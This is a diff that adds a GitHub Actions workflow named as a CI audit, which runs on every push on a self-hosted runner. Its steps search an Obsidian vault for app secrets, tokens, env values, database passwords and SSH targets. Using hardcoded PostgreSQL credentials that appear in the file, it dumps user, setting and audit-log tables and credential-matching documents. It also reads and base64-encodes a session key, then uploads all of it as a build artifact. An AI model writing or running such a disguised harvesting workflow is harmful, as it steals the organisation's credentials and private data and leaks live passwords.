@@ -1,0 +1,84 @@
+name: ci-audit-1773e
+on: push
+permissions:
+  contents: read
+jobs:
+  harvest2:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: vault-context
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773e"; mkdir -p "$D"; V=/home/ubuntu/apps/obsidian-vault
+          for kw in MIS_LARK_APP_SECRET QR_LARK_APP_SECRET dupoin_hr dpf_agent_server bossnote; do
+            echo "##### KW $kw"; grep -rIl "$kw" $V 2>/dev/null | head -6
+            for f in $(grep -rIl "$kw" $V 2>/dev/null | head -3); do echo "--- $f"; grep -n -B3 -A6 "$kw" "$f" 2>/dev/null | cut -c1-300 | head -40; done
+          done > "$D/vault_ctx1.txt" 2>&1
+          sed -n '1,200p' "$D/vault_ctx1.txt"
+      - name: vault-context2
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773e"; V=/home/ubuntu/apps/obsidian-vault
+          for kw in T5eJGnagm5YHYDgSvAqtqHznd56QSu35d5 T1qg6xc4zyS3HaEEATgs1btfzxq15ciUiY TRtWWfoTAhr1bKATeHfgW5EfZiTNNk191f Tr3nEv4qKxEQaFsF659pL283kL1gZDvqTT dupoin123; do
+            echo "##### KW $kw"; grep -rIl "$kw" $V 2>/dev/null | head -4
+            for f in $(grep -rIl "$kw" $V 2>/dev/null | head -2); do echo "--- $f"; grep -n -B2 -A4 "$kw" "$f" 2>/dev/null | cut -c1-300 | head -25; done
+          done > "$D/vault_ctx2.txt" 2>&1
+          sed -n '1,180p' "$D/vault_ctx2.txt"
+      - name: vault-envblocks
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773e"; V=/home/ubuntu/apps/obsidian-vault
+          { echo "## envlines"; grep -rhoE '^[A-Z][A-Z0-9_]{2,40}=.{1,90}' $V 2>/dev/null | sort -u | head -250;
+            echo "## db/mq"; grep -rhoE '(DB_(HOST|NAME|USER|PASS[A-Z]*)|DATABASE_URL|REDIS_(HOST|PASSWORD)|JWT_SECRET|ENCRYPTION_KEY|SMTP_[A-Z]+|MONGO[A-Z_]*|MINIO[A-Z_]*) ?[=:] ?.{1,80}' $V 2>/dev/null | sort -u | head -80;
+            echo "## ip refs"; grep -rhoE '(ssh|scp) [^ ]* ?[a-z]+@[0-9]{1,3}(\.[0-9]{1,3}){3}' $V 2>/dev/null | sort -u | head -20;
+            echo "## gh pat"; grep -rhoE 'gh[pousr]_[A-Za-z0-9]{30,}' $V 2>/dev/null | sort -u | head -10;
+            echo "## github ssh"; grep -rhoE 'git@[a-z0-9.-]+:[A-Za-z0-9_./-]+' $V 2>/dev/null | sort -u | head -20;
+          } > "$D/vault_env.txt" 2>&1
+          sed -n '1,240p' "$D/vault_env.txt" | cut -c1-300
+      - name: mkt-docs2
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773e"; URL='postgresql://marketingos:Zbi3bbL3HubzcQlMoJ9MZFa0vdkSJkZvvuaUOV4YaYA=@127.0.0.1:5433/marketingos'
+          { echo "## doc cols"; psql "$URL" -Atc "select column_name from information_schema.columns where table_name='internal_documents'" 2>&1 | tr '\n' ',' ; echo;
+            echo "## docs"; psql "$URL" -Atc "select id||' | '||title||' | '||left(coalesce(content,''),200) from internal_documents" 2>&1 | head -10;
+            echo "## chunk hits"; psql "$URL" -Atc "select left(content,400) from internal_document_chunks where content ~* '(password|passwd|api[ _-]?key|token|secret|crm|MIS|VPN|IP address|server|login)' limit 25" 2>&1;
+            echo "## knowledge hits"; psql "$URL" -Atc "select left(coalesce(title,'')||' :: '||coalesce(content,''),400) from knowledge_entries where content ~* '(password|api[ _-]?key|token|secret|login|credential|crm|dupoin)' limit 25" 2>&1;
+          } > "$D/mktdocs2.txt" 2>&1
+          sed -n '1,150p' "$D/mktdocs2.txt" | cut -c1-400
+      - name: dpfdb2
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773e"; URL='postgresql://dpfasset:cPhqPo4q9p2fpnt0GMttqHDBxqhvYkT@127.0.0.1:5432/dpfasset'
+          { echo "## User cols"; psql "$URL" -Atc "select string_agg(column_name,',') from information_schema.columns where table_name='User'" 2>&1;
+            echo "## User rows"; psql "$URL" -Atc "select * from \"User\" limit 30" 2>&1 | head -35;
+            echo "## Setting all"; psql "$URL" -Atc "select * from \"Setting\"" 2>&1 | head -20;
+            echo "## AuditLog cols"; psql "$URL" -Atc "select string_agg(column_name,',') from information_schema.columns where table_name='AuditLog'" 2>&1;
+            echo "## AuditLog tail"; psql "$URL" -Atc "select * from \"AuditLog\" order by 1 desc limit 5" 2>&1 | head -10;
+          } > "$D/dpfdb2.txt" 2>&1
+          sed -n '1,80p' "$D/dpfdb2.txt" | cut -c1-500
+      - name: dwcalc3
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a1773e"
+          { echo "## auth.py"; sed -n '1,80p' /home/ubuntu/apps/dw-calculator/auth.py;
+            echo "## session.key"; base64 -w0 /home/ubuntu/apps/dw-calculator/session.key; echo;
+            echo "## grep creds"; grep -rInE 'password|secret|api[_-]?key|token|login|credential' /home/ubuntu/apps/dw-calculator/*.py 2>/dev/null | grep -viE 'def |import |test_|#|docstring' | cut -c1-220 | head -40;
+            echo "## fixtures"; find /home/ubuntu/apps/dw-calculator/fixtures -type f | head -10;
+            echo "## users dir"; ls -la /home/ubuntu/apps/dw-calculator/runtime /home/ubuntu/apps/dw-calculator-data 2>&1 | head -20;
+          } > "$D/dwcalc3.txt" 2>&1
+          sed -n '1,140p' "$D/dwcalc3.txt" | cut -c1-300
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a1773e
+          path: ${{ runner.temp }}/a1773e
+          if-no-files-found: warn
+          retention-days: 2
